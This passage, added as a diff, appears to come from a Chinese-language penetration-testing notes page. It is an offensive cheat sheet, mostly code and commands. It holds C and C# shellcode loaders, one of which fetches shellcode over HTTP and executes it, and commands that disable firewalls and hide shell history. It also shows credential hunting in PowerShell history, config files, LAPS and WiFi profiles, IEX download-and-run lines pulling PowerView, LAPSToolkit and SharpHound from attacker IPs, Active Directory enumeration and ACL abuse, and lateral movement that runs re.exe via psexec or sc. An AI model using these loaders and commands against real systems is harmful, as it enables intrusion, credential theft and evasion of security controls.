+  //可执行ShellCode的指针被当作参数经过API的层层传递，回调函数执行完便会加载内部的ShellCode
+  EnumDateFormatsA((DATEFMT_ENUMPROCA)hAlloc, LOCALE_SYSTEM_DEFAULT, (DWORD)0);
+}
+</code></pre>
+<h4 id="堆申请内存："><a href="#堆申请内存：" class="headerlink" title="堆申请内存："></a>堆申请内存：</h4><pre><code class="c">#include &lt;Windows.h&gt;
+int main() {
+
+    unsigned char shellcode[] = &quot;&quot;;
+    
+    unsigned int key = 74;
+    
+    for (int i = 0; i &lt; sizeof(shellcode); i++) {
+            shellcode[i] ^= key;
+    }
+    //在堆中申请空间
+    HANDLE hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, sizeof(shellcode), 0);
+    LPVOID hHeapMemory = HeapAlloc(hHeap,HEAP_ZERO_MEMORY, sizeof(shellcode));
+    //把shellcode 写入堆空间
+    RtlCopyMemory(hHeapMemory, shellcode, sizeof(shellcode));
+    //创建线程的方式调用shellcode
+    LPDWORD lpThreadId = 0;
+    HANDLE hThread = CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)hHeapMemory,NULL,NULL,lpThreadId);
+    WaitForSingleObject(hThread, INFINITE);
+    // 关闭句柄
+    CloseHandle(hThread);
+    // 释放堆空间
+    HeapFree(hHeap, HEAP_NO_SERIALIZE, hHeapMemory);
+    return 0;
+}
+</code></pre>
+<h4 id="HTTP远程加载："><a href="#HTTP远程加载：" class="headerlink" title="HTTP远程加载："></a>HTTP远程加载：</h4><pre><code class="c">#include &lt;stdio.h&gt;
+#include &lt;Windows.h&gt;
+#include &lt;WinInet.h&gt;
+#pragma comment(lib, &quot;WinInet.lib&quot;)
+
+//函数体
+char* GetUrlPage(const char* URL, const char* SubPath)
+{	
+    //初始化句柄
+    HINTERNET hInternet, hConnect, hRequest = NULL;
+    //定义一个接收标志
+    DWORD dwOpenRequestFlags, dwRet = 0;
+    //初始化一个字符串指针
+    unsigned char* pResponseHeaderIInfo = NULL;
+    //响应头
+    DWORD dwResponseHeaderIInfoSize = 2048;
+    //字节指针
+    BYTE* pBuf = NULL;
+    DWORD dwBufSize = 64 * 2048;
+    hInternet = InternetOpenA(&quot;WinInetGet/0.1&quot;, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    hConnect = InternetConnectA(hInternet, URL, INTERNET_DEFAULT_HTTP_PORT, 0, 0, INTERNET_SERVICE_HTTP, 0, 0);
+    if (NULL == hConnect)
+        return NULL;
+    
+    dwOpenRequestFlags = INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP | INTERNET_FLAG_KEEP_CONNECTION |
+        INTERNET_FLAG_NO_AUTH | INTERNET_FLAG_NO_COOKIES | INTERNET_FLAG_NO_UI | INTERNET_FLAG_RELOAD;
+
+    hRequest = HttpOpenRequestA(hConnect, &quot;GET&quot;, SubPath, NULL, NULL, NULL, dwOpenRequestFlags, 0);
+    HttpSendRequest(hRequest, NULL, 0, NULL, 0);
+
+    pResponseHeaderIInfo = new unsigned char[dwResponseHeaderIInfoSize];
+    RtlZeroMemory(pResponseHeaderIInfo, dwResponseHeaderIInfoSize);
+    HttpQueryInfo(hRequest, HTTP_QUERY_RAW_HEADERS_CRLF, pResponseHeaderIInfo, &amp;dwResponseHeaderIInfoSize, NULL);
+    pBuf = new BYTE[dwBufSize];
+
+    RtlZeroMemory(pBuf, dwBufSize);
+    InternetReadFile(hRequest, pBuf, dwBufSize, &amp;dwRet);
+    return (char*)pBuf;
+}
+
+void main()
+{
+    char* shellcode = GetUrlPage(&quot;ip&quot;, &quot;/shellcode&quot;);
+    //printf(&quot;%s \n&quot;, shellcode);
+    int shellcode_length = strlen(shellcode);
+
+    unsigned char* value = (unsigned char*)calloc(shellcode_length / 2, sizeof(unsigned char));
+    for (size_t count = 0; count &lt; shellcode_length / 2; count++) {
+        sscanf_s(shellcode, &quot;%2hhx&quot;, &amp;value[count]);
+        shellcode += 2;
+    }
+
+    void* exec = VirtualAlloc(0, shellcode_length / 2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    memcpy(exec, value, shellcode_length / 2);
+    ((void(*)())exec)();
+}
+</code></pre>
+<h4 id="C-加载器："><a href="#C-加载器：" class="headerlink" title="C#加载器："></a>C#加载器：</h4><pre><code class="c#">using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Net;
+using System.Text;
+using System.Threading;
+
+namespace ConsoleApp1
+{
+    class Program
+    {
+        [DllImport(&quot;kernel32.dll&quot;, SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
+            uint flAllocationType, uint flProtect);
+
+        [DllImport(&quot;kernel32.dll&quot;)]
+        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, 
+            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, 
+                  uint dwCreationFlags, IntPtr lpThreadId);
+
+        [DllImport(&quot;kernel32.dll&quot;)]
+        static extern UInt32 WaitForSingleObject(IntPtr hHandle, 
+            UInt32 dwMilliseconds);
+        
+        static void Main(string[] args)
+        {
+            byte[] buf = new byte[752] {
+              0xfc,0x48,0x83,0xe4...
+
+            int size = buf.Length;
+
+            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
+
+            Marshal.Copy(buf, 0, addr, size);
+
+            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, 
+                IntPtr.Zero, 0, IntPtr.Zero);
+
+            WaitForSingleObject(hThread, 0xFFFFFFFF);
+        }
+    }
+}
+</code></pre>
+<p>进程隐藏：</p>
+<pre><code>//find InstallUtil
+dir \Windows\Microsoft.NET\* /s/b | findstr InstallUtil.exe$
+
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile=
+/LogToConsole=false /U .\InstallUtilBypass.exe
+</code></pre>
+<h4 id="KillAV："><a href="#KillAV：" class="headerlink" title="KillAV："></a>KillAV：</h4><pre><code>X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+</code></pre>
+<h1 id="PostPenetration"><a href="#PostPenetration" class="headerlink" title="PostPenetration"></a>PostPenetration</h1><h4 id="Iptable："><a href="#Iptable：" class="headerlink" title="Iptable："></a>Iptable：</h4><pre><code class="bat">#添加入站规则
+iptables -I INPUT 1 -s &lt;IP&gt; -j ACCEPT
+#添加出站规则  
+iptables -I OUTPUT 1 -d &lt;IP&gt; -j ACCEPT
+</code></pre>
+<h4 id="隐藏历史操作记录："><a href="#隐藏历史操作记录：" class="headerlink" title="隐藏历史操作记录："></a>隐藏历史操作记录：</h4><pre><code class="bash">#临时禁用历史命令记录功能.命令前有一个空格:
+set +o history
+</code></pre>
+<h4 id="防火墙状态："><a href="#防火墙状态：" class="headerlink" title="防火墙状态："></a>防火墙状态：</h4><pre><code class="powershell">#防火墙状态
+Get-NetFirewallProfile | Format-Table Name, Enabled
+#禁用防火墙
+Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False
+NetSh Advfirewall set allprofiles state off
+#当前防火墙规则
+Get-NetFirewallRule | select DisplayName, Enabled, Description
+#通过与端口建立链接来间接监测防火墙规则
+Test-NetConnection -ComputerName 127.0.0.1 -Port 80
+#查看防火墙规则具体开放端口
+Get-NetFirewallRule |findstr name
+
+关闭防火墙：netsh firewall set opmode mode=disable
+关闭防火墙： netsh advfirewall set allprofiles state off
+查看防火墙状态： netsh advfirewall show allprofiles
+防火墙恢复默认配置：netsh firewall reset
+</code></pre>
+<p>Cmd.exe:</p>
+<pre><code class="bat">netsh advfirewall show currentprofile
+
+netsh advfirewall firewall show rule name=all
+#查看防火墙配置:
+netsh firewall show config
+#关闭防火墙：
+net sh addvfirewall set allprofiles state off
+#添加入站规则：
+netsh advfirewall firewall add rule name=&quot;规则名称&quot; dir=in action=allow program=&quot;程序路径&quot; enable=yes
+#添加出站规则：
+netsh advfirewall firewall add rule name=&quot;规则名称&quot; dir=out action=allow program=&quot;程序路径&quot; enable=yes
+#放行端口：
+netsh advfirewall firewall add rule name =&quot;Remote Desktop&quot; protocol=TCP  localport=3389  dir=in action=allow
+</code></pre>
+<h4 id="系统安装应用："><a href="#系统安装应用：" class="headerlink" title="系统安装应用："></a>系统安装应用：</h4><pre><code>wmic product get name, version, vendor
+
+WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List | more
+</code></pre>
+<h4 id="文件打包归档："><a href="#文件打包归档：" class="headerlink" title="文件打包归档："></a>文件打包归档：</h4><pre><code>#打包压缩文件
+tar -czvf Archive.tar.gz &quot;C:\Path\To\Your\Folder&quot;
+#查找隐藏文件
+Get-ChildItem -Hidden -Path C:\Users\kkidd\Desktop\
+</code></pre>
+<h4 id="日志功能列表："><a href="#日志功能列表：" class="headerlink" title="日志功能列表："></a>日志功能列表：</h4><pre><code>#获取日志列表
+Get-EventLog -List
+#系统监视器 sysmon:
+Get-Process | Where-Object { $_.ProcessName -eq &quot;Sysmon&quot; }
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational
+#测试系统正在监控什么
+findstr /si &#39;&lt;ProcessCreate onmatch=&quot;exclude&quot;&gt;&#39; C:\tools\*
+</code></pre>
+<h4 id="查看本地硬盘："><a href="#查看本地硬盘：" class="headerlink" title="查看本地硬盘："></a>查看本地硬盘：</h4><pre><code class="bat">wmic logicaldisk list brief
+</code></pre>
+<h4 id="PowerShellHistory："><a href="#PowerShellHistory：" class="headerlink" title="PowerShellHistory："></a>PowerShellHistory：</h4><pre><code class="powershell">
+#cmd
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+#powershell
+type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+cat (Get-PSReadlineOption).HistorySavePath
+cat (Get-PSReadlineOption).HistorySavePath | sls passw
+    
+type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+</code></pre>
+<h4 id="遍历目录："><a href="#遍历目录：" class="headerlink" title="遍历目录："></a>遍历目录：</h4><pre><code class="bat">dir /a /b /s c: &gt; info.txt
+type info.txt | findstr /i passw
+type info.txt | findstr /i web.config
+type info.txt | findstr /i web-inf.xml
+info.txt | findstr /i PASSWD
+tree c:\users /f
+</code></pre>
+<h4 id="检测目标权限："><a href="#检测目标权限：" class="headerlink" title="检测目标权限："></a>检测目标权限：</h4><pre><code>accesschk.exe &quot;student&quot; C:\Windows -wus
+icacls.exe C:\Windows\Tasks
+</code></pre>
+<h4 id="NET版本"><a href="#NET版本" class="headerlink" title=".NET版本:"></a>.NET版本:</h4><pre><code>Get-ChildItem &#39;HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP&#39; -Recurse |
+Get-ItemProperty -name Version -EA 0 | Where-Object { $_.PSChildName -match
+&#39;^(?!S)\p{L}&#39;} | Select-Object -Property PSChildName, Version
+</code></pre>
+<h4 id="LAPS："><a href="#LAPS：" class="headerlink" title="LAPS："></a>LAPS：</h4><p>AdmPwd处于开启状态：</p>
+<pre><code class="powershell">reg query &quot;HKLM\Software\Policies\Microsoft Services\AdmPwd&quot; /v AdmPwdEnabled
+Get-DomainObject -Identity web01 -Properties &quot;ms-mcs-AdmPwd&quot;,name
+
+IEX(new-object net.webclient).downloadstring(&#39;http://192.168.45.192/PowerView.ps1&#39;)
+Get-NetGroup | findstr name
+Get-NetGroupMember &quot;LAPS Password Readers&quot; |findstr MemberName
+
+IEX(new-object net.webclient).downloadstring(&#39;http://10.10.16.91/LAPSToolkit.ps1&#39;)
+Get-LAPSComputers ComputerName Password Expiration
+
+Find-LAPSDelegatedGroups
+Get-NetGroupMember -GroupName &quot;LAPS Password Readers&quot;
+</code></pre>
+<h4 id="IIS文件："><a href="#IIS文件：" class="headerlink" title="IIS文件："></a>IIS文件：</h4><pre><code>type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
+C:\inetpub\wwwroot\web.config
+Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
+Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
+</code></pre>
+<h4 id="批量自动安装配置文件："><a href="#批量自动安装配置文件：" class="headerlink" title="批量自动安装配置文件："></a>批量自动安装配置文件：</h4><pre><code class="bat">C:\Windows\Panther\ 
+C:\Windows\Panther\Unattend\ 
+C:\Windows\System32\ 
+C:\Windows\System32\sysprep\
+C:\Unattend.xml
+C:\Windows\Panther\Unattend.xml
+C:\Windows\Panther\Unattend\Unattend.xml
+C:\Windows\Panther\Unattend\Unattended.xml
+C:\Windows\system32\sysprep.inf
+C:\Windows\system32\sysprep\sysprep.xml
+</code></pre>
+<h4 id="PSCredential："><a href="#PSCredential：" class="headerlink" title="PSCredential："></a>PSCredential：</h4><pre><code class="powershell">powershell -c &quot;$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *&quot;
+C:\Users\nico\Desktop&gt;powershell -c &quot;$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *&quot;
+</code></pre>
+<h4 id="SharpView："><a href="#SharpView：" class="headerlink" title="SharpView："></a>SharpView：</h4><pre><code>Get-DomainGPOUserLocalGroupMapping
+Find-GPOLocation
+Get-DomainGPOComputerLocalGroupMapping
+Find-GPOComputerAdmin
+Get-DomainObjectAcl
+Get-ObjectAcl
+Add-DomainObjectAcl
+Add-ObjectAcl
+Remove-DomainObjectAcl
+Get-RegLoggedOn
+Get-LoggedOnLocal
+Get-NetRDPSession
+Test-AdminAccess
+Invoke-CheckLocalAdminAccess
+Get-WMIProcess
+Get-NetProcess
+Get-WMIRegProxy
+Get-Proxy
+Get-WMIRegLastLoggedOn
+Get-LastLoggedOn
+Get-WMIRegCachedRDPConnection
+Get-CachedRDPConnection
+Get-WMIRegMountedDrive
+Get-RegistryMountedDrive
+Find-InterestingDomainAcl
+Invoke-ACLScanner
+Get-NetShare
+Get-NetLoggedon
+Get-NetLocalGroup
+Get-NetLocalGroupMember
+Get-NetSession
+Get-PathAcl
+ConvertFrom-UACValue
+Get-PrincipalContext
+New-DomainGroup
+New-DomainUser
+Add-DomainGroupMember
+Set-DomainUserPassword
+Invoke-Kerberoast
+Export-PowerViewCSV
+Find-LocalAdminAccess
+Find-DomainLocalGroupMember
+Find-DomainShare
+Find-DomainUserEvent
+Find-DomainProcess
+Find-DomainUserLocation
+Find-InterestingFile
+Find-InterestingDomainShareFile
+Find-DomainObjectPropertyOutlier
+TestMethod
+Get-Domain
+Get-NetDomain
+Get-DomainComputer
+Get-NetComputer
+Get-DomainController
+Get-NetDomainController
+Get-DomainFileServer
+Get-NetFileServer
+Convert-ADName
+Get-DomainObject
+Get-ADObject
+Get-DomainUser
+Get-NetUser
+Get-DomainGroup
+Get-NetGroup
+Get-DomainDFSShare
+Get-DFSshare
+Get-DomainDNSRecord
+Get-DNSRecord
+Get-DomainDNSZone
+Get-DNSZone
+Get-DomainForeignGroupMember
+Find-ForeignGroup
+Get-DomainForeignUser
+Find-ForeignUser
+ConvertFrom-SID
+Convert-SidToName
+Get-DomainGroupMember
+Get-NetGroupMember
+Get-DomainManagedSecurityGroup
+Find-ManagedSecurityGroups
+Get-DomainOU
+Get-NetOU
+Get-DomainSID
+Get-Forest
+Get-NetForest
+Get-ForestTrust
+Get-NetForestTrust
+Get-DomainTrust
+Get-NetDomainTrust
+Get-NetForestDomain
+Get-DomainSite
+Get-NetSite
+Get-DomainSubnet
+Get-NetSubnet
+Get-DomainTrustMapping
+Invoke-MapDomainTrust
+Get-ForestGlobalCatalog
+Get-NetForestCatalog
+Get-DomainUserEvent
+Get-UserEvent
+Get-DomainGUIDMap
+Get-GUIDMap
+Resolve-IPAddress
+Get-IPAddress
+ConvertTo-SID
+Invoke-UserImpersonation
+Invoke-RevertToSelf
+Get-DomainSPNTicket
+Request-SPNTicket
+Get-NetComputerSiteName
+Get-SiteName
+Get-DomainGPO
+Get-NetGPO
+Set-DomainObject
+Set-ADObject
+Add-RemoteConnection
+Remove-RemoteConnection
+Get-IniContent
+Get-GptTmpl
+Get-GroupsXML
+Get-DomainPolicyData
+Get-DomainPolicy
+Get-DomainGPOLocalGroup
+Get-NetGPOGroup
+</code></pre>
+<h4 id="PowerView："><a href="#PowerView：" class="headerlink" title="PowerView："></a>PowerView：</h4><pre><code class="powershell">#获取存在域：
+Get-NetDomainController | select Forest, Name, OSVersion | fl
+
+#枚举当前域策略
+$DomainPolicy = Get-DomainPolicy -Policy Domain
+$DomainPolicy.KerberosPolicy
+$DomainPolicy.SystemAccess
+
+#枚举域森林：
+Get-NetForest
+Get-netforestdomain
+Get-NetForest -Forest Forest Name
+
+get-netdomaintrust
+nltest /trusted_domains
+Get-DomainTrust -API
+Get-DomainTrust -NET
+Get-DomainUser -Domain corp1.com | Select-Object -ExpandProperty samaccountname
+Get-DomainTrust -Domain corp1.com
+Get-DomainTrustMapping
+Get-DomainComputer -Domain prod.corp1.com | Select-Object -ExpandProperty samaccountname
+
+#域SID：
+Get-DomainSID -Domain prod.corp1.com
+
+#获取在本域用户并也是其他域的组成员
+Get-DomainForeignGroupMember -Domain corp2.com
+
+#枚举森林中的所有全局目录
+Get-ForestGlobalCatalog
+
+#域策略:
+Get-DomainPolicyData | select -ExpandProperty SystemAccess
+
+#域用户：
+Get-netuser | select samaccountname
+
+#域机器：
+get-netcomputer |select distinguishedname,serverreferencebl,objectclass,name,objectsid,samaccountname,msdfsr-computerreferencebl,objectcategory,serviceprincipalname,dnshostname
+
+#域组织OU
+get-netou | select name
+
+#枚举域组：
+get-netgroup| select samaccountname
+
+#枚举组成员：
+get-netgroupmember –identity &quot;Domain Admins&quot;
+
+#枚举组策略：
+get-netgpo| select displayname
+
+#枚举域用户登录主机位置：（默认域管理员）
+Find-DomainUserLocation | select UserName, SessionFromName
+
+#枚举本地域会话信息
+Get-NetSession -ComputerName dc-2 | select CName, UserName
+
+Invoke-UserHunter
+
+#通过SID反向查找用户
+convertfrom-sid S-1-5-21-634106289-3621871093-708134407-1110
+
+#枚举SPN用户：
+get-netuser –spn | select samaccountname
+
+#枚举无需预认证的用户：
+get-netuser –preauthnotrequired | select samaccountname
+
+#枚举可访问的SMB Share：
+find-domainshare -checkshareaccess
+
+#枚举非约束委派的主机：
+Get-DomainUser -Unconstrained | select dnshostname, samaccountname
+
+#枚举约束委派：
+Get-DomainUser -TrustedToAuth | select dnshostname, samaccountname, msds-allowedtodelegateto
+
+#查找任何具有约束委派 st 的用户/计算机
+Get-DomainUser -TrustedToAuth
+Get-DomainComputer -TrustedToAuth
+
+#枚举所有允许无约束委派的服务器，以及所有未标记为敏感/不进行委派的特权用户：
+$Computers = Get-DomainComputer -Unconstrained
+$Users = Get-DomainUser -AllowDelegation -AdminCount
+
+#枚举允许不受约束的 Kerberos 委派的服务器并显示所有登录的用户
+Find-DomainUserLocation -ComputerUnconstrained -ShowAll
+
+#寻找允许委托的管理员用户，登录到允许无约束委托的服务器
+Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation
+
+#枚举特定用户/组身份拥有本地管理员权限的机器
+Get-DomainGPOUserLocalGroupMapping -Identity &lt;User/Group&gt;
+
+#枚举指定域中的给定用户对哪些机器具有 RDP 访问权限
+Get-DomainGPOUserLocalGroupMapping -Identity &lt;USER&gt; -Domain &lt;DOMAIN&gt; -LocalGroup RDP
+
+#导出所有 GPO 映射的 csv
+Get-DomainGPOUserLocalGroupMapping | %{$_.computers = $_.computers -join &quot;, &quot;; $_} | Export-CSV -NoTypeInformation gpo_map.csv
+
+#使用tokenGroups“递归”，获取用户有效所属的所有组:
+Get-DomainGroup -MemberIdentity &lt;User/Group&gt;
+
+#获取一个组的所有有效成员
+Get-DomainGroupMember -Identity &quot;Domain Admins&quot; -Recurse
+
+#对任何函数使用备用凭证
+$SecPassword = ConvertTo-SecureString &#39;BurgerBurgerBurger!&#39; -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential(&#39;TESTLAB\dfm.a&#39;, $SecPassword)
+Get-DomainUser -Credential $Cred
+
+#检索 GPP 密码适用的所有计算机 dns 主机名：
+Get-DomainOU -GPLink &#39;&lt;GPP_GUID&gt;&#39; | % {Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname}
+</code></pre>
+<p>枚举当前林中，来自corp1.com之外的组成员：</p>
+<pre><code>$DomainTrusts = ([System.DirectoryServices.ActiveDirectory.Forest::GetCurrentForest()).Domains
+.Name; ForEach ($Domain in $DomainTrusts) { $Groups = Get-DomainGroup -Domain
+$Domain; ForEach ($Group in $Groups) { $Members = Get-NetGroupMember -Identity
+$Group.name; ForEach ($Member in $Members) { If ($Member.MemberDomain -notlike
+&quot;*corp1.com*&quot; -and [string]::IsNullOrWhiteSpace($Member.MemberDomain) -eq 
+$false) { Write-Host &quot;[*] $($Group.DistinguishedName) contains
+$($Member.MemberName) with member domain of $($Member.MemberDomain)&quot; } } } }
+</code></pre>
+<h4 id="SMB"><a href="#SMB" class="headerlink" title="SMB:"></a>SMB:</h4><pre><code class="powershell"># In an smbclient interactive session
+recurse ON
+prompt OFF
+mget *
+
+#windows：
+findstr /snip password *.xml *.ini *.txt
+findstr /snip password *
+
+#PowerView模块也可用于查找有趣的文件：
+Find-InterestingFile -LastAccessTime (Get-Date).AddDays(-7)
+Find-InterestingFile -Include &quot;private,confidential&quot;
+Find-InterestingFile -Path &quot;\\$SERVER\$Share&quot; -OfficeDocs
+
+#工具：
+https://github.com/SnaffCon/Snaffler
+snaffler.exe -s -o snaffler.log
+</code></pre>
+<h4 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP:"></a>LDAP:</h4><pre><code class="bash"># enumerate users (anonymous bind)
+windapsearch --dc $DomainController --module users
+# obtain metadata (anonymous bind)
+windapsearch --dc $DomainController --module metadata
+ldapsearch -x -h &lt;IP&gt; -D &#39;&#39; -w &#39;&#39; -b &quot;DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;&quot;
+ldapsearch -x -b &quot;dc=streamIO,dc=htb&quot; -H ldap://10.10.11.158 &gt; ldap.txt
+#搜集域控信息：
+ldapsearch-ad.py -l $ip -t info
+
+#LADPSEARCH-AD脚本可用于枚举基本信息，例如密码设置永不过期的域管理员，默认密码策略以及GPO、信任、kerberoastable账户等中的密码策略：
+ldapsearch-ad.py -l $IP -d $DOMAIN -u $USER -p $PASSWD -t all
+ldapsearch-ad.py -l $IP -d $DOMAIN -u $USER -hashes :$HASH -t show-admins
+#可以使用以下命令列出 FFL（森林功能级别）、DFL（域功能级别）、DCFL（域控制器功能级别）和命名上下文。
+ldapsearch-ad --type info --server $DOMAIN_CONTROLLER --domain $DOMAIN --username $USER --password $PASSWORD
+
+#从域中提取所有内容：
+ldapsearch -x -h &lt;IP&gt; -D &#39;&lt;DOMAIN&gt;\&lt;username&gt;&#39; -w &#39;&lt;password&gt;&#39; -b &quot;DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;&quot;
+
+#提取用户：
+ldapsearch -x -h &lt;IP&gt; -D &#39;&lt;DOMAIN&gt;\&lt;username&gt;&#39; -w &#39;&lt;password&gt;&#39; -b &quot;CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;&quot;
+#Example: ldapsearch -x -h &lt;IP&gt; -D &#39;MYDOM\john&#39; -w &#39;johnpassw&#39; -b &quot;CN=Users,DC=mydom,DC=local&quot;
+#提取主机：
+ldapsearch -x -h &lt;IP&gt; -D &#39;&lt;DOMAIN&gt;\&lt;username&gt;&#39; -w &#39;&lt;password&gt;&#39; -b &quot;CN=Computers,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;&quot;
+#提取自己的信息：
+ldapsearch -x -h &lt;IP&gt; -D &#39;&lt;DOMAIN&gt;\&lt;username&gt;&#39; -w &#39;&lt;password&gt;&#39; -b &quot;CN=&lt;MY NAME&gt;,CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;&quot;
+#提取域管理员：
+ldapsearch -x -h &lt;IP&gt; -D &#39;&lt;DOMAIN&gt;\&lt;username&gt;&#39; -w &#39;&lt;password&gt;&#39; -b &quot;CN=Domain Admins,CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;&quot;
+#域用户：
+ldapsearch -x -h &lt;IP&gt; -D &#39;&lt;DOMAIN&gt;\&lt;username&gt;&#39; -w &#39;&lt;password&gt;&#39; -b &quot;CN=Domain Users,CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;&quot;
+#企业管理员：
+ldapsearch -x -h &lt;IP&gt; -D &#39;&lt;DOMAIN&gt;\&lt;username&gt;&#39; -w &#39;&lt;password&gt;&#39; -b &quot;CN=Enterprise Admins,CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;&quot;
+#管理员：
+ldapsearch -x -h &lt;IP&gt; -D &#39;&lt;DOMAIN&gt;\&lt;username&gt;&#39; -w &#39;&lt;password&gt;&#39; -b &quot;CN=Administrators,CN=Builtin,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;&quot;
+#远程管理组：
+ldapsearch -x -h &lt;IP&gt; -D &#39;&lt;DOMAIN&gt;\&lt;username&gt;&#39; -w &#39;&lt;password&gt;&#39; -b &quot;CN=Remote Desktop Users,CN=Builtin,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;&quot;
+#要查看是否有权访问密码，可在每次执行上述查询紧根grep
+&lt;ldapsearchcmd...&gt; | grep -i -A2 -B2 &quot;userpas&quot;
+</code></pre>
+<h4 id="BloodhoundAD："><a href="#BloodhoundAD：" class="headerlink" title="BloodhoundAD："></a>BloodhoundAD：</h4><pre><code class="bat">. .\SharpHound.ps1
+iex(new-object net.webclient).downloadstring(&#39;http://10.10.16.91/SharpHound.ps1&#39;)
+</code></pre>
+<pre><code class="bat">Invoke-Bloodhound -CollectionMethod All -ZipFileName loot.zip
+Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
+</code></pre>
+<h4 id="ADExplorer："><a href="#ADExplorer：" class="headerlink" title="ADExplorer："></a>ADExplorer：</h4><pre><code class="bat">https://learn.microsoft.com/en-us/sysinternals/downloads/adexplorer
+</code></pre>
+<p>导出域内信息：</p>
+<pre><code>ADExplorer.exe -snapshot &quot;&quot; result.dat /accepteula
+</code></pre>
+<p>使用 ADExplorerSnapshot.py 将 dat 文件解析为 BloodHound 可解析的格式。</p>
+<pre><code>https://github.com/c3c/ADExplorerSnapshot.py
+</code></pre>
+<pre><code>python3 ADExplorerSnapshot.py result.dat -o result
+</code></pre>
+<h4 id="DACL"><a href="#DACL" class="headerlink" title="DACL:"></a>DACL:</h4><pre><code>Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member
+-NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID
+$_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq
+$(&quot;$env:UserDomain\$env:Username&quot;)) {$_}}
+//可替换用户
+Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member
+-NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID
+$_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq
+$(&quot;$env:UserDomain\tim&quot;)) {$_}}
+
+#Get-DomainGroup
+Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | AddMember -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID
+$_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq
+$(&quot;$env:UserDomain\$env:Username&quot;)) {$_}}
+
+PS C:\tools&gt; net group testgroup offsec /add /domain
+
+#Get-DomainComputer
+Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | AddMember -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID
+$_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq
+$(&quot;$env:UserDomain\$env:Username&quot;)) {$_}}
+
+#WriteDACL
+Add-DomainObjectAcl -TargetIdentity testservice2 -PrincipalIdentity offsec -Rights All
+</code></pre>
+<h4 id="wifi："><a href="#wifi：" class="headerlink" title="wifi："></a>wifi：</h4><pre><code class="bat">#列出wifi名称
+netsh wlan show profile
+#获取wifi密码
+netsh wlan show profile &lt;wifi name&gt; key=clear
+#提取所有wifi密码
+echo. &amp; for /f &quot;tokens=4 delims=: &quot; %a in (&#39;netsh wlan show profiles ^| find &quot;Profile &quot;&#39;) do @echo off &gt; nul &amp; (netsh wlan show profiles name=%a key=clear | findstr &quot;SSID Cipher Content&quot; | find /v &quot;Number&quot; &amp; echo.) &amp; @echo on
+</code></pre>
+<h1 id="Lateral-Movement"><a href="#Lateral-Movement" class="headerlink" title="Lateral Movement"></a>Lateral Movement</h1><h4 id="远程服务"><a href="#远程服务" class="headerlink" title="远程服务"></a>远程服务</h4><pre><code>dir \\cdc01\c$
+copy \\192.168.45.233\kali\re.exe \\cdc01\c$\\users\public\
+.\psexec.exe -accepteula \\cdc01 c:\users\public\re.exe
+sc \\cdc01 create rev binpath=c:\users\public\re.exe
+sc \\cdc01 qc rev
+sc \\cdc01 start rev
+</code></pre>
